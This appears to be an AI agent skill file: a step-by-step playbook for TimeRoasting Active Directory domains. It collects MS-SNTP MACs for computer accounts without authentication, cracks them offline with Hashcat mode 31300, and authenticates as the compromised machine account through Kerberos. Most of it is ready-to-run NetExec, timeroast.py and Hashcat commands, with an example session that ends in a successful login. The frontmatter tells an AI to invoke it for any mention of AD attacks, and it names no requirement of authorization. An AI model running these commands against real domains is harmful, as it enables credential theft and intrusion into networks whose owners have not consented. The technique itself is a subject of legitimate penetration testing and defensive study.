---
name: timeroast-ad-attack
description: How to perform TimeRoasting attacks against Active Directory to recover computer account passwords via MS-SNTP MAC collection and offline cracking. Use this skill whenever the user mentions Active Directory attacks, computer account password recovery, MS-SNTP, time-based attacks, NTP authentication abuse, or wants to enumerate/crack computer account credentials in AD environments. Also trigger for any request about the Secura Timeroast vulnerability, NetExec timeroast module, or Hashcat mode 31300.
---

# TimeRoasting Attack Methodology

TimeRoasting abuses the legacy MS-SNTP (Microsoft Simple Network Time Protocol) authentication extension to recover computer account passwords from Active Directory domains.

## What is TimeRoasting?

In MS-SNTP, a client can send a 68-byte request that embeds any computer account RID (Relative Identifier). The domain controller uses the computer account's NTLM hash (MD4) as the key to compute a MAC (Message Authentication Code) over the response and returns it. Attackers can collect these MS-SNTP MACs **unauthenticated** and crack them offline using Hashcat mode 31300 to recover computer account passwords.

### Why This Works

- The attack is **unauthenticated** - no credentials needed to collect MACs
- The crypto-checksum is MD5-based and can be cracked offline
- Computer account passwords are often weak or follow predictable patterns
- Once cracked, the password can be used for Kerberos authentication

## Prerequisites

- Network access to a Domain Controller (UDP port 123)
- Knowledge of target domain or ability to enumerate computer RIDs
- Hashcat installed for offline cracking
- Wordlist for password cracking

## Attack Workflow

### Step 1: Enumerate and Collect MS-SNTP MACs

Use NetExec's timeroast module to collect MACs for computer RIDs:

```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
```

**Output format:** `$sntp-ms$*<rid>*md5*<salt>*<mac>`

**Alternative:** Use the original Timeroast tool:

```bash
sudo ./timeroast.py <dc_ip> | tee ntp-hashes.txt
```

### Step 2: Crack the Hashes Offline

Use Hashcat mode 31300 (MS-SNTP MAC):

```bash
# Basic cracking
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt

# With username flag to preserve RIDs for convenience
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username

# Let recent hashcat auto-detect the hash type
hashcat timeroast.hashes /path/to/wordlist.txt --username
```

### Step 3: Use Recovered Credentials

The recovered cleartext corresponds to a computer account password. Try it directly as the machine account using Kerberos:

```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```

## Operational Tips

### Time Synchronization

Ensure accurate time sync before Kerberos authentication:

```bash
sudo ntpdate <dc_fqdn>
```

### Kerberos Configuration

If needed, generate krb5.conf for the AD realm:

```bash
netexec smb <dc_fqdn> --generate-krb5-file krb5.conf
```

### RID to Principal Mapping

Map RIDs to principals later via LDAP/BloodHound once you have any authenticated foothold. Common patterns:
- RID 1000+ typically corresponds to computer accounts
- Computer account names often follow patterns like `HOSTNAME$`

### Wordlist Recommendations

- Use wordlists targeting computer account passwords
- Consider patterns like `Password1!`, `Spring2024!`, etc.
- Include seasonal patterns and common admin defaults

## Technical Details

### Protocol Behavior

When `ExtendedAuthenticatorSupported` ADM element is false:
1. Client sends a 68-byte request
2. Client embeds the RID in the least significant 31 bits of the Key Identifier subfield
3. Server verifies message size is 68 bytes
4. Server extracts RID and calls `NetrLogonComputeServerDigest`
5. Server returns response with Key Identifier = 0 and computed crypto-checksum

### Hash Format

```
$sntp-ms$*<rid>*md5*<salt>*<mac>
```

- `rid`: The computer account RID that was queried
- `md5`: Indicates MD5-based crypto-checksum
- `salt`: Salt value used in computation
- `mac`: The Message Authentication Code to crack

## References

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

## Example Session

```bash
# 1. Collect MACs from DC
netexec smb dc01.corp.local -M timeroast
# Output: dc01.corp.local 1125 $sntp-ms$*1125*md5*abc123*def456

# 2. Save hashes
echo '$sntp-ms$*1125*md5*abc123*def456' > timeroast.hashes

# 3. Crack with Hashcat
hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt --username
# Output: $sntp-ms$*1125*md5*abc123*def456:Summer2024!

# 4. Test credentials
netexec smb dc01.corp.local -u IT-COMPUTER3$ -p 'Summer2024!' -k
# Success: Authentication successful
```

## When to Use This Attack

- You have network access to a Domain Controller
- You need to enumerate computer account credentials
- You want an unauthenticated attack vector
- You're performing Active Directory penetration testing
- You've identified MS-SNTP as a potential attack surface
